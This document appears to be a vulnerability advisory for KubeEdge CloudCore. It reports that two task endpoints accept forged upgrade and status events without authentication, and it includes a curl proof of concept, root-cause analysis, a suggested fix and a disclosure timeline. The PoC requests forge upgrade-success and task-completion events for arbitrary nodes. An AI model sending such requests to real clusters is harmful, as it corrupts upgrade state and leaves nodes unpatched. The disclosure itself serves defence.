https://github.com/kubeedge/kubeedge/

## Finding: Unauthenticated task-event injection on CloudCore /nodeupgrade and /task/status endpoints

There are two endpoints on CloudCore's HTTPS server (default port 10002) that
accept requests without any authentication, while a third adjacent endpoint
on the same server correctly enforces a bearer token or client certificate.

The affected endpoints are:

  POST /nodeupgrade
  POST /task/{taskType}/name/{taskID}/node/{nodeID}/status

Both handlers read the request body and path parameters and immediately
forward a message to the internal beehive task manager bus without verifying
the caller's identity. The handler for GET /edge.crt on the same server
explicitly verifies a bearer token or a valid TLS client certificate and
returns HTTP 401 when neither is present.

An attacker with network access to CloudCore port 10002 can:

1. Mark any in-progress NodeUpgradeJob as succeeded before the real edge
   node completes the upgrade, leaving the node on an old version while the
   control plane considers it current.
2. Permanently mark any upgrade task as failed for a given edge node,
   halting future upgrade scheduling for that node.
3. Inject arbitrary task-completion events for any task type (upgrade,
   config-update, image-prepull) against any node name in the cluster.
4. Enumerate all registered Kubernetes node names via the unauthenticated
   GET /node/{nodename} endpoint (HTTP 200 vs 404).

PoC

Confirmed against kubeedge/cloudcore:v1.20.0 deployed via keadm on a kind
cluster.
```
Step 1 -- confirm auth-protected endpoint rejects unauthenticated request:

  curl -sk https://CLOUDCORE:10002/edge.crt -H "node-name: test"
  # HTTP 401 -- token validation failure, token is empty

Step 2 -- inject forged upgrade-success event, no credentials:

  curl -sk -X POST https://CLOUDCORE:10002/nodeupgrade \
    -H "Content-Type: application/json" \
    -d '{"upgradeID":"target-task-id","nodeName":"victim-node","status":"upgrade_success"}'
  # HTTP 200 -- ok

Step 3 -- inject forged status event for any task and any node:

  curl -sk -X POST \
    https://CLOUDCORE:10002/task/upgrade/name/TARGET-TASK/node/VICTIM-NODE/status \
    -H "Content-Type: application/json" \
    -d '{"NodeName":"VICTIM-NODE","Event":"Upgrade","Action":"Success","Reason":"injected"}'
  # HTTP 200 -- ok
```

Root cause

The go-restful container in cloud/pkg/cloudhub/servers/httpserver/server.go
has no global authentication filter. The nodetask handlers
(nodetask/upgrade.go and nodetask/report_status.go) do not call any
equivalent of the verifyAuthorization or verifyCert checks that protect
GET /edge.crt.

Suggested fix: add the same bearer-token or client-certificate verification
used by EdgeCoreClientCert as a before-filter on the nodetask routes, or as
a global filter on the restful container.

Affected version: HEAD b07338d0 (v1.20.0 and prior; no prior GHSA covers
this class of vulnerability).


### Disclosure
 - 27 May 2026: reported via email
 - 1 June 2026: report acknowledged
 - 27 August 2026: followed up for update
 - 28 August 2026: https://github.com/kubeedge/kubeedge/releases

<img width="674" height="304" alt="image" src="https://github.com/user-attachments/assets/6ed8fdff-853c-410d-b01b-af6c76a4ca04" />
